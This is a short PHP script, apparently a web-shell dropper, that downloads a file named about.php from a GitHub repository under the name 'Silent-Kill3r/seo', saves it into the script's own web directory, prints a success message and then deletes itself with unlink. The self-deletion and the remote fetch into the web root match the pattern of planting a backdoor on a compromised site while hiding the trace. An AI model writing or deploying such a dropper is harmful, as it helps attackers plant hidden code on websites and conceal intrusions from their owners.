<?php
// URL to fetch
$url = "https://raw.githubusercontent.com/Silent-Kill3r/seo/refs/heads/main/about.php";
// Path to save about.php
$save_path = __DIR__ . "/about.php";

// Download and save the file
$data = file_get_contents($url);
if ($data !== false && file_put_contents($save_path, $data)) {
    echo "about.php uploaded successfully.<br>";
} else {
    echo "Failed to download or save about.php.<br>";
}

// Self-delete
$me = __FILE__;
echo "Deleting: " . basename($me);
unlink($me);
?>
